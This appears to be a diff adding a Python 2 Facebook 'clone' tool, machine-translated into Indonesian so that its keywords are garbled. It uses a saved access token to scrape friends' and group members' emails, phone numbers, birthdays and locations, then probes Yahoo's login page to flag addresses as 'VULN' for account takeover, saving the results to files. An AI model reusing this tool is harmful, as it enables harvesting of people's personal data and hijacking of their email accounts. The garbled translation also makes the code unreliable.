+		print " \ 033 [1; 96m [+] \ 033 [1; 92mTotal Grup \ 033 [1; 91m: \ 033 [1; 97m% s" % ( len ( listgrup ))
+		cetak ( " \ 033 [1; 96m [+] \ 033 [1; 92mPenyimpan \ 033 [1; 91m: \ 033 [1; 97mout / Grupid.txt" )
+		f . tutup ()
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+	kecuali ( KeyboardInterrupt , EOFError ):
+		cetak ( " \ 033 [1; 96m [!] \ x1b [1; 91mTerhenti" )
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+	kecuali  KeyError :
+		os . hapus ( 'out / Grupid.txt' )
+		print ( ' \ 033 [1; 96m [!] \ x1b [1; 91mGroup tidak ditemukan' )
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+	kecuali  permintaan . pengecualian . ConnectionError :
+		print " \ 033 [1; 96m [✖] \ x1b [1; 91mTidak ada koneksi"
+		keluar ()
+	kecuali  IOError :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mError"
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+
+def  informasi ():
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 91m [!] Token tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	os . sistem ( 'jelas' )
+	cetak  logo
+	cetak  42 * " \ 033 [1; 96m ="
+	aid  =  raw_input ( ' \ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID / Nama \ 033 [1; 91m: \ 033 [1; 97m' )
+	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mTunggu sebentar \ 033 [1; 97m ...' )
+	r  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token=' + toket )
+	cok  =  json . memuat ( r . teks )
+	untuk  saya  di  cok [ 'data' ]:
+		jika  bantuan  dalam  saya [ 'nama' ] atau  bantuan  dalam  saya [ 'id' ]:
+			x  =  permintaan . dapatkan ( "https://graph.facebook.com/" + i [ 'id' ] + "? access_token =" + toket )
+			z  =  json . memuat ( x . teks )
+			cetak  43 * " \ 033 [1; 96m ="
+			coba :
+				cetak  ' \ 033 [1; 96m [➹] \ 033 [1; 93mNama \ 033 [1; 97m:' + z [ 'nama' ]
+			kecuali  KeyError : cetak  ' \ 033 [1; 96m [?] \ 033 [1; 93mNama \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
+			coba :
+				cetak  ' \ 033 [1; 96m [➹] \ 033 [1; 93mID \ 033 [1; 97m:' + z [ 'id' ]
+			kecuali  KeyError : cetak  ' \ 033 [1; 96m [?] \ 033 [1; 93mID \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
+			coba :
+				cetak  ' \ 033 [1; 96m [➹] \ 033 [1; 93mEmail \ 033 [1; 97m:' + z [ 'email' ]
+			kecuali  KeyError : cetak  ' \ 033 [1; 96m [?] \ 033 [1; 93mEmail \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
+			coba :
+				cetak  ' \ 033 [1; 96m [➹] \ 033 [1; 93mTidak ada HP \ 033 [1; 97m:' + z [ 'mobile_phone' ]
+			kecuali  KeyError : cetak  ' \ 033 [1; 96m [?] \ 033 [1; 93mTidak ada HP \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
+			coba :
+				cetak  ' \ 033 [1; 96m [➹] \ 033 [1; 93mTempat tinggal \ 033 [1; 97m:' + z [ 'lokasi' ] [ 'nama' ]
+			kecuali  KeyError : cetak  ' \ 033 [1; 96m [?] \ 033 [1; 93mTempat tinggal \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
+			coba :
+				print  ' \ 033 [1; 96m [➹] \ 033 [1; 93mTanggal lahir \ 033 [1; 97m:' + z [ 'ulang tahun' ]
+			kecuali  KeyError : print  ' \ 033 [1; 96m [?] \ 033 [1; 93mTanggal lahir \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
+			coba :
+				cetak  ' \ 033 [1; 96m [➹] \ 033 [1; 93mSekolah \ 033 [1; 97m:'
+				untuk  q  dalam  z [ 'pendidikan' ]:
+					coba :
+						cetak  ' \ 033 [1; 91m ~ \ 033 [1; 97m' + q [ 'sekolah' ] [ 'nama' ]
+					kecuali  KeyError : cetak  ' \ 033 [1; 91m ~ \ 033 [1; 91mTidak ada'
+			kecuali  KeyError : lulus
+			raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+			menu ()
+		lain :
+			lulus
+	lain :
+		print " \ 033 [1; 96m [✖] \ x1b [1; 91mAkun tidak ditemukan"
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+
+def  yahoo ():
+	 toket global
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 91m [!] Token tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	os . sistem ( 'jelas' )
+	cetak  logo
+	cetak  42 * " \ 033 [1; 96m ="
+	cetak  " \ x1b [1; 97m1. \ x1b [1; 93m Klon dari daftar teman"
+	cetak  " \ x1b [1; 97m2. \ x1b [1; 93m Klon dari teman"
+	cetak  " \ x1b [1; 97m3. \ x1b [1; 93m Klon dari grup anggota"
+	cetak  " \ x1b [1; 97m4. \ x1b [1; 93m Kloning dari file"
+	cetak  " \ n \ x1b [1; 91m0. \ x1b [1; 91m Kembali"
+	clone ()
+	def  clone ():
+	embuh  =  raw_input ( " \ n \ x1b [1; 97m >>>" )
+	jika  embuh  == "" :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
+	elif  embuh  == "1" :
+		clone_dari_daftar_teman ()
+	elif  embuh  == "2" :
+		clone_dari_teman ()
+	elif  embuh  == "3" :
+		clone_dari_member_group ()
+	elif  embuh  == "4" :
+		clone_dari_file ()
+	elif  embuh  == "0" :
+		menu ()
+	lain :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
+		
+
+def  clone_dari_daftar_teman ():
+	 toket global
+	os . sistem ( 'reset' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 91m [!] Token Tidak Valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+		coba :
+		os . mkdir ( 'keluar' )
+	kecuali  OSError :
+		lulus
+	os . sistem ( 'jelas' )
+	cetak  logo
+	mpsh  = []
+	jml  =  0
+	cetak  42 * " \ 033 [1; 96m ="
+	jalan ( ' \ 033 [1; 96m [ \ x1b [1; 97m✺ \ x1b [1; 96m] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...' )
+	teman  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token=' + toket )
+	kimak  =  json . memuat ( teman . teks )
+	jalan ( ' \ 033 [1; 96m [ \ x1b [1; 97m✺ \ x1b [1; 96m] \ 033 [1; 93m Mulai \ 033 [1; 97m ...' )
+	cetak ( ' \ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z' )
+	cetak  42 * " \ 033 [1; 96m ="
+	untuk  w  di  kimak [ 'data' ]:
+		jml  + = 1
+		mpsh . tambahkan ( jml )
+		id  =  w [ 'id' ]
+		nama  =  w [ 'name' ]
+		links  =  permintaan . dapatkan ( "https://graph.facebook.com/" + id + "? access_token =" + toket )
+		z  =  json . memuat ( tautan . teks )
+		coba :
+		mail  =  z [ 'email' ]
+			yahoo  =  ulang . kompilasi ( r '@. *' )
+			otw  =  yahoo . cari ( mail ). grup ()
+			if  'yahoo.com'  dalam  otw :
+				br . buka ( "https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com" )
+				br . _factory . is_html  =  Benar
+				br . select_form ( nr = 0 )
+				br [ "username" ] =  email
+				klik  =  br . kirim (). baca ()
+				jok  =  re . kompilasi ( r '"messages.ERROR_INVALID_USERNAME">. *' )
+				coba :
+					pek  =  jok . cari ( klik ). grup ()
+				kecuali :
+					terus
+				jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
+					cetak ( " \ 033 [1; 96m [✓] \ 033 [1; 92mVULN" )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mID    \ 033 [1; 91m: \ 033 [1; 92m" + id )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama +  ' \ n ' )
+					save  =  open ( 'out / MailVuln.txt' , 'a' )
+					simpan . tulis ( "Nama:" +  nama  +  ' \ n '  "ID:" +  id  +  ' \ n '  "Email:" +  mail  +  ' \ n \ n ' )
+					simpan . tutup ()
+					berhasil . tambahkan ( mail )
+		kecuali  KeyError :
+			lulus
+	cetak  42 * " \ 033 [1; 96m ="
+	cetak  ' \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str ( len ( berhasil ))
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / MailVuln.txt"
+	raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+	menu ()
+	def  clone_dari_teman ():
+	 toket global
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	coba :
+		os . mkdir ( 'keluar' )
+	kecuali  OSError :
+		lulus
+	os . sistem ( 'jelas' )
+	cetak  logo
+	mpsh  = []
+	jml  =  0
+	cetak  42 * " \ 033 [1; 96m ="
+	idt  =  raw_input ( " \ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID teman \ 033 [1; 91m: \ 033 [1; 97m" )
+	coba :
+		jok  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "? access_token =" + toket )
+		op  =  json . memuat ( jok . text )
+		cetak " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama \ 033 [1; 91m: \ 033 [1; 97m" + op [ "name" ]
+	kecuali  KeyError :
+		print " \ 033 [1; 96m [!] \ x1b [1; 91mTeman tidak ditemukan"
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...' )
+	teman  =  permintaan . dapatkan ( 'https://graph.facebook.com/' + idt + '/ teman? access_token =' + toket )
+	kimak  =  json . memuat ( teman . teks )
+	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...' )
+	cetak ( ' \ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z' )
+	cetak  43 * " \ 033 [1; 96m ="
+	untuk  w  di  kimak [ 'data' ]:
+		jml  + = 1
+		mpsh . tambahkan ( jml )
+		id  =  w [ 'id' ]
+		nama  =  w [ 'name' ]
+		links  =  permintaan . dapatkan ( "https://graph.facebook.com/" + id + "? access_token =" + toket )
+		z  =  json . memuat ( tautan . teks )
+		coba :
+		mail  =  z [ 'email' ]
+			yahoo  =  ulang . kompilasi ( r '@. *' )
+			otw  =  yahoo . cari ( mail ). grup ()
+			if  'yahoo.com'  dalam  otw :
+				br . buka ( "https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com" )
+				br . _factory . is_html  =  Benar
+				br . select_form ( nr = 0 )
+				br [ "username" ] =  email
+				klik  =  br . kirim (). baca ()
+				jok  =  re . kompilasi ( r '"messages.ERROR_INVALID_USERNAME">. *' )
+				coba :
+					pek  =  jok . cari ( klik ). grup ()
+				kecuali :
+					terus
+				jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
+					cetak ( " \ 033 [1; 96m [✓] \ 033 [1; 92mVULN" )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mID    \ 033 [1; 91m: \ 033 [1; 92m" + id )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama )
+					save  =  open ( 'out / TemanMailVuln.txt' , 'a' )
+					simpan . tulis ( "Nama:" +  nama  +  ' \ n '  "ID:" +  id  +  ' \ n '  "Email:" +  mail  +  ' \ n \ n ' )
+					simpan . tutup ()
+					berhasil . tambahkan ( mail )
+		kecuali  KeyError :
+			lulus
+	cetak  42 * " \ 033 [1; 96m ="
+	cetak  ' \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str ( len ( berhasil ))
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / TemanMailVuln.txt"
+	raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+	menu ()
+	def  clone_dari_member_group ():
+	 toket global
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	coba :
+		os . mkdir ( 'keluar' )
+	kecuali  OSError :
+		lulus
+	os . sistem ( 'jelas' )
+	cetak  logo
+	mpsh  = []
+	jml  =  0
+	cetak  42 * " \ 033 [1; 96m ="
+	id = raw_input ( ' \ 033 [1; 96m [+] \ 033 [1; 93mMasukan grup ID \ 033 [1; 91m: \ 033 [1; 97m' )
+	coba :
+		r = permintaan . dapatkan ( 'https://graph.facebook.com/group/?id=' + id + '& access_token =' + toket )
+		asw = json . memuat ( r . teks )
+		cetak " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama grup \ 033 [1; 91m: \ 033 [1; 97m" + asw [ 'name' ]
+	kecuali  KeyError :
+		print " \ 033 [1; 96m [!] \ x1b [1; 91mGroup tidak ditemukan"
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...' )
+	teman  =  permintaan . dapatkan ( 'https://graph.facebook.com/' + id + '/ members? bidang = nama, id & batas = 999999999 & access_token =' + toket )
+	kimak  =  json . memuat ( teman . teks )
+	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...' )
+	cetak ( ' \ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z' )
+	cetak  42 * " \ 033 [1; 96m ="
+	untuk  w  di  kimak [ 'data' ]:
+		jml  + = 1
+		mpsh . tambahkan ( jml )
+		id  =  w [ 'id' ]
+		nama  =  w [ 'name' ]
+		links  =  permintaan . dapatkan ( "https://graph.facebook.com/" + id + "? access_token =" + toket )
+		z  =  json . memuat ( tautan . teks )
+		coba :
+			mail  =  z [ 'email' ]
+			yahoo  =  ulang . kompilasi ( r '@. *' )
+			otw  =  yahoo . cari ( mail ). grup ()
+			if  'yahoo.com'  dalam  otw :
+				br . buka ( "https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com" )
+				br . _factory . is_html  =  Benar
+				br . select_form ( nr = 0 )
+				br [ "username" ] =  email
+				klik  =  br . kirim (). baca ()
+				jok  =  re . kompilasi ( r '"messages.ERROR_INVALID_USERNAME">. *' )
+				coba :
+					pek  =  jok . cari ( klik ). grup ()
+				kecuali :
+					terus
+				jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
+					cetak ( " \ 033 [1; 96m [✓] \ 033 [1; 92mVULN" )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mID    \ 033 [1; 91m: \ 033 [1; 92m" + id )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail )
+					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama )
+					save  =  open ( 'out / GrupMailVuln.txt' , 'a' )
+					simpan . tulis ( "Nama:" +  nama  +  ' \ n '  "ID:" +  id  +  ' \ n '  "Email:" +  mail  +  ' \ n \ n ' )
+					simpan . tutup ()
+					berhasil . tambahkan ( mail )
+		kecuali  KeyError :
+			lulus
+			cetak  42 * " \ 033 [1; 96m ="
+	cetak  ' \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str ( len ( berhasil ))
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / GrupMailVuln.txt"
+	raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+	menu ()
+	
+
+def  clone_dari_file ():
+	 toket global
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	coba :
+		os . mkdir ( 'keluar' )
+	kecuali  OSError :
+		lulus
+	os . sistem ( 'jelas' )
+	cetak  logo
+	cetak  42 * " \ 033 [1; 96m ="
+	files  =  raw_input ( " \ 033 [1; 96m [+] \ 033 [1; 93mNama File \ 033 [1; 91m: \ 033 [1; 97m" )
+	coba :
+		total  =  terbuka ( file , "r" )
+		mail  =  total . readlines ()
+	kecuali  IOError :
+		print " \ 033 [1; 96m [!] \ x1b [1; 91mFile tidak ditemukan"
+		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+		menu ()
+	mpsh  = []
+	jml  =  0
+	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...' )
+	cetak ( ' \ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z' )
+	cetak  42 * " \ 033 [1; 96m ="
+	mail  =  open ( file , "r" ). readlines ()
+	untuk  pw  dalam  surat :
+		mail  =  pw . ganti ( " \ n " , "" )
+		jml  + = 1
+		mpsh . tambahkan ( jml )
+		yahoo  =  ulang . kompilasi ( r '@. *' )
+		otw  =  yahoo . cari ( mail ). grup ()
+		if  'yahoo.com'  dalam  otw :
+			br . buka ( "https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com" )
+			br . _factory . is_html  =  Benar
+			br . select_form ( nr = 0 )
+			br [ "username" ] =  email
+			klik  =  br . kirim (). baca ()
+			jok  =  re . kompilasi ( r '"messages.ERROR_INVALID_USERNAME">. *' )
+			coba :
+				pek  =  jok . cari ( klik ). grup ()
+			kecuali :
+				terus
+			jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
+				cetak ( " \ 033 [1; 96m [✓]\ 033 [1; 92mVULN" )
+				cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" +mail )
+				save  =  open ( 'out / MailVuln.txt' ,'a' )
+				simpan . tulis ( "Email:" +  mail  +  ' \ n \ n ' )
+				menyimpan . tutup ()
+				berhasil . menambahkan ( mail )
+	cetak  42 *" \ 033 [1; 96m ="
+	cetak  ' \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str ( len ( berhasil ))
+	print " \ 033 [1; 96m [+] \ 033 [1; 92mFile Tersimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / FileMailVuln.txt"
+	raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+	menu ()
+	
+       
+		
+jika  __name__  ==  '__main__' :
+	siapa ()
